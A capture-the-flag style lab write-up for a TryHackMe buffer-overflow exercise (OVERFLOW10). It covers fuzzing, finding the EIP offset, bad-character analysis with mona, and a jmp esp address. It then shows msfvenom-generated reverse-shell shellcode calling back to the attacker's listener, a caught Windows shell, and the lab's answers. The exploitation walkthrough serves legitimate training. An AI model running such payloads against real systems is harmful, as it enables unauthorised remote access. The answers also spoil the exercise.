# OVERFLOW10
## Mona Configuration
```
!mona config -set workingfolder C:\mona\%p
```
## Fuzzing
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 10$ ./fuzzer.py
Fuzzing with 100 bytes
Fuzzing with 200 bytes
Fuzzing with 300 bytes
Fuzzing with 400 bytes
Fuzzing with 500 bytes
Fuzzing with 600 bytes
Fuzzing crashed at 600 bytes
```
## Controlling EIP
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 10$ cyclic 1000
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaaj
```
Program crashes with `6B666161` in EIP register
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 10$ python -c 'print(bytes.fromhex("6B666161")[::-1].decode())'
aafk
```
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 10$ cyclic -l aafk
537
```
Offset to EIP register is `537 bytes`
## Finding Bad Chars
In Immunity:
```
!mona bytearray -b "\x00"
```
On attack box (use as payload in `exploit.py`)
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 10$ python -c '[print("\\x" + "{:02x}".format(x), end="") for x in range(1,256)]'
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```
Re-run `exploit.py` and then run comparison in Immunity (`01A4FA30` is address of ESP):
```
!mona compare -f C:\mona\oscp\bytearray.bin -a 01A4FA30
```
```
mona Memory comparison results, item 0
 Address=0x01a4fa30
 Status=Corruption after 159 bytes
 BadChars=00 a0 a1 ad ae be bf de df ef f0
 Type=normal
 Location=Stack
```
Bad chars are `\x00\xa0\xad\xbe\xde\xef`
## Finding a Jump Point
```
!mona jmp -r esp -b "\x00\xa0\xad\xbe\xde\xef"
```
```
Log data, item 4
 Address=62501203
 Message=  0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
```
We will jump to address `\x03\x12\x50\x62`
## Payload
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 10$ msfvenom -p windows/shell_reverse_tcp LHOST=10.6.23.1 LPORT=4444 EXITFUNC=thread -b "\x00\xa0\xad\xbe\xde\xef" -f c
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 12 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of c file: 1491 bytes
unsigned char buf[] =
"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\x81\x2c\x07\x6c\x83\xee\xfc\xe2\xf4\x7d\xc4\x85\x6c"
"\x81\x2c\x67\xe5\x64\x1d\xc7\x08\x0a\x7c\x37\xe7\xd3\x20"
"\x8c\x3e\x95\xa7\x75\x44\x8e\x9b\x4d\x4a\xb0\xd3\xab\x50"
"\xe0\x50\x05\x40\xa1\xed\xc8\x61\x80\xeb\xe5\x9e\xd3\x7b"
"\x8c\x3e\x91\xa7\x4d\x50\x0a\x60\x16\x14\x62\x64\x06\xbd"
"\xd0\xa7\x5e\x4c\x80\xff\x8c\x25\x99\xcf\x3d\x25\x0a\x18"
"\x8c\x6d\x57\x1d\xf8\xc0\x40\xe3\x0a\x6d\x46\x14\xe7\x19"
"\x77\x2f\x7a\x94\xba\x51\x23\x19\x65\x74\x8c\x34\xa5\x2d"
"\xd4\x0a\x0a\x20\x4c\xe7\xd9\x30\x06\xbf\x0a\x28\x8c\x6d"
"\x51\xa5\x43\x48\xa5\x77\x5c\x0d\xd8\x76\x56\x93\x61\x73"
"\x58\x36\x0a\x3e\xec\xe1\xdc\x44\x34\x5e\x81\x2c\x6f\x1b"
"\xf2\x1e\x58\x38\xe9\x60\x70\x4a\x86\xd3\xd2\xd4\x11\x2d"
"\x07\x6c\xa8\xe8\x53\x3c\xe9\x05\x87\x07\x81\xd3\xd2\x3c"
"\xd1\x7c\x57\x2c\xd1\x6c\x57\x04\x6b\x23\xd8\x8c\x7e\xf9"
"\x90\x06\x84\x44\x0d\x6a\x96\x2d\x6f\x6e\x81\x3d\x5b\xe5"
"\x67\x46\x17\x3a\xd6\x44\x9e\xc9\xf5\x4d\xf8\xb9\x04\xec"
"\x73\x60\x7e\x62\x0f\x19\x6d\x44\xf7\xd9\x23\x7a\xf8\xb9"
"\xe9\x4f\x6a\x08\x81\xa5\xe4\x3b\xd6\x7b\x36\x9a\xeb\x3e"
"\x5e\x3a\x63\xd1\x61\xab\xc5\x08\x3b\x6d\x80\xa1\x43\x48"
"\x91\xea\x07\x28\xd5\x7c\x51\x3a\xd7\x6a\x51\x22\xd7\x7a"
"\x54\x3a\xe9\x55\xcb\x53\x07\xd3\xd2\xe5\x61\x62\x51\x2a"
"\x7e\x1c\x6f\x64\x06\x31\x67\x93\x54\x97\xe7\x71\xab\x26"
"\x6f\xca\x14\x91\x9a\x93\x54\x10\x01\x10\x8b\xac\xfc\x8c"
"\xf4\x29\xbc\x2b\x92\x5e\x68\x06\x81\x7f\xf8\xb9";
```
## Exploit
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 10$ ./exploit.py
Sending evil buffer...
Done!
```
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 10$ nc -lnvp 4444
Connection from 10.10.80.211:49220
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\admin\Desktop\vulnerable-apps\oscp>echo PWNED OVERFLOW10
echo PWNED OVERFLOW10
PWNED OVERFLOW10

C:\Users\admin\Desktop\vulnerable-apps\oscp>
```
## Questions
What is the EIP offset for OVERFLOW10?
```
537
```
In byte order (e.g. \\x00\\x01\\x02) and including the null byte \\x00, what were the badchars for OVERFLOW10?
```
\x00\xa0\xad\xbe\xde\xef
```